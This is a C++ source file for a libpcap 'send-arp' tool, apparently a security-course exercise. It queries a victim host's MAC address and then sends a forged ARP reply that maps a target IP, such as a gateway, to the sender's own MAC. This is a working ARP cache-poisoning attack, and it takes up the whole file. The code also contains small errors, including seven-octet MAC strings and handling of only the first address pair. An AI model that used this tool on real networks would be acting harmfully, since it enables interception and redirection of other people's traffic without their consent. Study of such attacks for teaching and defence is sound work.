#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample: send-arp-test wlan0\n");
}

bool get_MyMac(char* macaddr,const char *if_config)
{
    struct ifreq ifr;
    unsigned char* mac = NULL;
    int socketd = socket(AF_INET, SOCK_STREAM, 0);
    if(socketd < 0)
    {
        perror("socket");
        return false;
    }
    strcpy(ifr.ifr_name, if_config);
    if(ioctl(socketd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        return false;
    }
    mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(macaddr,"%02x:%02x:%02x:%02x:%02x:%02x",
		    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
};

/* https://technote.kr/176 */
bool get_myIP(char* myip, const char *if_config)
{
    struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, if_config, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
				myip,sizeof(struct sockaddr));
	}
	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char my_mac[20];
	char sender_mac[20];
    char my_ip[20];
	char* sender_ip = argv[2];
	char* target_ip = argv[3];

	if(!get_MyMac(my_mac, dev))
		return -1;
	if(!get_myIP(my_ip, dev))
		return -1;

	EthArpPacket Packet;

	Packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff:ff");
	Packet.eth_.smac_ = Mac(my_mac);
	Packet.eth_.type_ = htons(EthHdr::Arp);

	Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	Packet.arp_.pro_ = htons(EthHdr::Ip4);
	Packet.arp_.hln_ = Mac::SIZE;
	Packet.arp_.pln_ = Ip::SIZE;
	Packet.arp_.op_ = htons(ArpHdr::Request);
	Packet.arp_.smac_ = Mac(my_mac); 
	Packet.arp_.sip_ = htonl(Ip(my_ip));
	Packet.arp_.tmac_ = Mac("00:00:00:00:00:00:00");
	Packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while(1)
	{
		const u_char* packet;
		struct pcap_pkthdr* header;
		res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr re_Ether;
        ArpHdr re_Arp;
        u_char* p = (u_char*)packet;
        u_char* ether_length = p + sizeof(EthHdr);
		if(memcpy(&re_Ether, p, sizeof(EthHdr)) == NULL){
			return -1;
		}

		if(re_Ether.type() != EthHdr::Arp){
            if(re_Ether.dmac().operator!=(Mac(my_mac))){
                continue;
            }
        }
		
		if(memcpy(&re_Arp, ether_length, sizeof(ArpHdr)) == NULL){
			return -1;
		}

		if(re_Arp.op() != ArpHdr::Reply){
            if(re_Arp.tmac_.operator!=(Mac(my_mac))){   
                if(!re_Arp.tip().operator==(Ip(my_ip))){
			        continue;
                }
            }
        }

		sprintf(sender_mac,"%s",((std::string)re_Ether.smac()).c_str());
		break;
	}
	EthArpPacket arp_packet;

	arp_packet.eth_.dmac_ = Mac(sender_mac);
	arp_packet.eth_.smac_ = Mac(my_mac);
	arp_packet.eth_.type_ = htons(EthHdr::Arp);

	arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
	arp_packet.arp_.hln_ = Mac::SIZE;
	arp_packet.arp_.pln_ = Ip::SIZE;
	arp_packet.arp_.op_ = htons(ArpHdr::Reply);
	arp_packet.arp_.smac_ = Mac(my_mac);
	arp_packet.arp_.sip_ = htonl(Ip(target_ip));
	arp_packet.arp_.tmac_ = Mac(sender_mac);
	arp_packet.arp_.tip_ = htonl(Ip(sender_ip));


	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	pcap_close(handle);
	return 0;
}